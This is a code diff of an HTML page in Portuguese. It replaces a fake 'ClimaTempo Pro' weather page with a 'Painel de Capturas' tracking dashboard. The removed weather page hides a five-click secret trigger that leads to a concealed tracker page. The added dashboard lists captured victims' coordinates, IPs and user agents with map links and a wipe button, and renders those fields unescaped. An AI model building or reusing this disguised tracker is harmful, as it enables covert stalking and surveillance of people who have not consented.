@@ -3,120 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ClimaTempo Pro - Previsão do Tempo</title>
-    <!-- Tailwind CSS -->
+    <title>Painel de Rastreamento</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- FontAwesome Icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
-        body { font-family: 'Inter', sans-serif; }
-    </style>
 </head>
-<body class="bg-gradient-to-br from-blue-900 via-indigo-900 to-slate-950 text-white min-h-screen flex flex-col justify-between p-4 sm:p-6 antialiased select-none">
+<body class="bg-gray-900 text-gray-100 min-h-screen p-6">
 
-    <header class="max-w-md w-full mx-auto flex justify-between items-center py-2">
-        <div class="flex items-center gap-2">
-            <i class="fa-solid fa-cloud-sun text-cyan-400 text-xl"></i>
-            <span class="font-bold tracking-wide text-sm sm:text-base">ClimaTempo Pro</span>
-        </div>
-        <div class="text-xs text-cyan-200/80 bg-white/10 px-3 py-1 rounded-full backdrop-blur-md">
-            <i class="fa-solid fa-location-dot mr-1"></i> São Paulo, SP
-        </div>
-    </header>
-
-    <main class="max-w-md w-full mx-auto my-auto flex flex-col items-center">
-        <!-- Main Weather Card / Secret Trigger Element -->
-        <div id="weather-card" class="w-full bg-white/10 backdrop-blur-xl border border-white/20 rounded-3xl p-6 sm:p-8 shadow-2xl relative overflow-hidden transition transform active:scale-95 cursor-pointer">
-            <div class="absolute -top-12 -right-12 w-36 h-36 bg-cyan-400/20 rounded-full blur-2xl pointer-events-none"></div>
-
-            <div class="text-center mb-6">
-                <h1 class="text-2xl sm:text-3xl font-bold tracking-tight mb-1">São Paulo</h1>
-                <p class="text-xs sm:text-sm text-cyan-200 font-medium">Hoje, 13 de Setembro</p>
-            </div>
-
-            <div class="flex flex-col items-center my-4">
-                <div class="text-cyan-300 text-6xl sm:text-7xl mb-2 drop-shadow-lg">
-                    <i class="fa-solid fa-cloud-sun"></i>
-                </div>
-                <div class="text-5xl sm:text-6xl font-extrabold tracking-tighter my-2">
-                    24°<span class="text-2xl font-normal text-cyan-200">C</span>
-                </div>
-                <p class="text-sm sm:text-base font-medium text-slate-200">Parcialmente Nublado</p>
-            </div>
-
-            <div class="grid grid-cols-3 gap-2 mt-6 pt-6 border-t border-white/10 text-center">
-                <div class="bg-black/20 p-3 rounded-2xl">
-                    <i class="fa-solid fa-droplet text-cyan-400 mb-1 text-sm"></i>
-                    <span class="block text-[10px] text-slate-300 uppercase font-semibold">Umidade</span>
-                    <span class="text-xs sm:text-sm font-bold">65%</span>
-                </div>
-                <div class="bg-black/20 p-3 rounded-2xl">
-                    <i class="fa-solid fa-wind text-cyan-400 mb-1 text-sm"></i>
-                    <span class="block text-[10px] text-slate-300 uppercase font-semibold">Vento</span>
-                    <span class="text-xs sm:text-sm font-bold">12 km/h</span>
-                </div>
-                <div class="bg-black/20 p-3 rounded-2xl">
-                    <i class="fa-solid fa-gauge text-cyan-400 mb-1 text-sm"></i>
-                    <span class="block text-[10px] text-slate-300 uppercase font-semibold">Pressão</span>
-                    <span class="text-xs sm:text-sm font-bold">1013 hPa</span>
-                </div>
+    <div class="max-w-5xl mx-auto">
+        <div class="flex justify-between items-center mb-6">
+            <h1 class="text-2xl font-bold text-emerald-400">Painel de Capturas</h1>
+            <div class="space-x-2">
+                <button onclick="carregarRegistros()" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg text-sm transition">Atualizar</button>
+                <button onclick="limparRegistros()" class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-lg text-sm transition">Limpar Histórico</button>
             </div>
         </div>
 
-        <!-- Hourly forecast preview -->
-        <div class="w-full mt-4 bg-white/5 backdrop-blur-md border border-white/10 rounded-2xl p-4 flex justify-between items-center text-center">
-            <div>
-                <span class="block text-[10px] text-slate-400">15:00</span>
-                <i class="fa-solid fa-sun text-amber-400 my-1"></i>
-                <span class="block text-xs font-bold">25°C</span>
-            </div>
-            <div>
-                <span class="block text-[10px] text-slate-400">18:00</span>
-                <i class="fa-solid fa-cloud-sun text-cyan-300 my-1"></i>
-                <span class="block text-xs font-bold">22°C</span>
-            </div>
-            <div>
-                <span class="block text-[10px] text-slate-400">21:00</span>
-                <i class="fa-solid fa-moon text-indigo-300 my-1"></i>
-                <span class="block text-xs font-bold">19°C</span>
-            </div>
-            <div>
-                <span class="block text-[10px] text-slate-400">00:00</span>
-                <i class="fa-solid fa-cloud text-slate-400 my-1"></i>
-                <span class="block text-xs font-bold">17°C</span>
+        <div class="bg-gray-800 rounded-xl shadow-lg border border-gray-700 overflow-hidden">
+            <div class="overflow-x-auto">
+                <table class="w-full text-left text-sm">
+                    <thead class="bg-gray-700 text-gray-300 uppercase text-xs">
+                        <tr>
+                            <th class="p-4">Data/Hora</th>
+                            <th class="p-4">Latitude / Longitude</th>
+                            <th class="p-4">IP / Dispositivo</th>
+                            <th class="p-4">Ação</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tabela-corpo" class="divide-y divide-gray-700">
+                        <tr>
+                            <td colspan="4" class="p-4 text-center text-gray-400">Carregando registros...</td>
+                        </tr>
+                    </tbody>
+                </table>
             </div>
         </div>
-    </main>
-
-    <footer class="max-w-md w-full mx-auto text-center text-[11px] text-slate-400 py-2">
-        &copy; 2026 ClimaTempo Pro Serviços Meteorológicos. Todos os direitos reservados.
-    </footer>
+    </div>
 
     <script>
-        let clickCount = 0;
-        let resetTimer = null;
+        async function carregarRegistros() {
+            try {
+                const res = await fetch('/api/registros');
+                const dados = await res.json();
+                const tbody = document.getElementById('tabela-corpo');
 
-        const weatherCard = document.getElementById('weather-card');
+                if (dados.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="4" class="p-4 text-center text-gray-400">Nenhuma captura realizada ainda.</td></tr>`;
+                    return;
+                }
 
-        weatherCard.addEventListener('click', () => {
-            clickCount++;
-
-            // Clear previous timeout to enforce consecutive speed
-            clearTimeout(resetTimer);
-            
-            // Reset counter if time between clicks exceeds 1.2 seconds
-            resetTimer = setTimeout(() => {
-                clickCount = 0;
-            }, 1200);
-
-            // Secret trigger threshold: 5 consecutive clicks
-            if (clickCount >= 5) {
-                clickCount = 0;
-                // Redirects securely to the hidden tracker dashboard
-                window.location.href = 'rastreador.html';
+                tbody.innerHTML = dados.map(item => `
+                    <tr class="hover:bg-gray-750 transition">
+                        <td class="p-4 font-mono text-gray-300">${item.dataHora}</td>
+                        <td class="p-4 font-mono text-emerald-300">${item.latitude}, ${item.longitude}</td>
+                        <td class="p-4 max-w-xs truncate text-xs text-gray-400" title="${item.userAgent}">
+                            <div><strong>IP:</strong> ${item.ip}</div>
+                            <div class="truncate">${item.userAgent}</div>
+                        </td>
+                        <td class="p-4">
+                            <a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="bg-emerald-600 hover:bg-emerald-700 text-white px-3 py-1 rounded text-xs font-semibold inline-block">Ver no Mapa</a>
+                        </td>
+                    </tr>
+                `).join('');
+            } catch (err) {
+                console.error('Erro ao carregar dados:', err);
             }
-        });
+        }
+
+        async function limparRegistros() {
+            if (confirm('Tem certeza que deseja apagar todos os registros?')) {
+                await fetch('/api/registros', { method: 'DELETE' });
+                carregarRegistros();
+            }
+        }
+
+        window.onload = carregarRegistros;
+        setInterval(carregarRegistros, 10000); // Atualiza a cada 10 segundos
     </script>
 </body>
 </html>
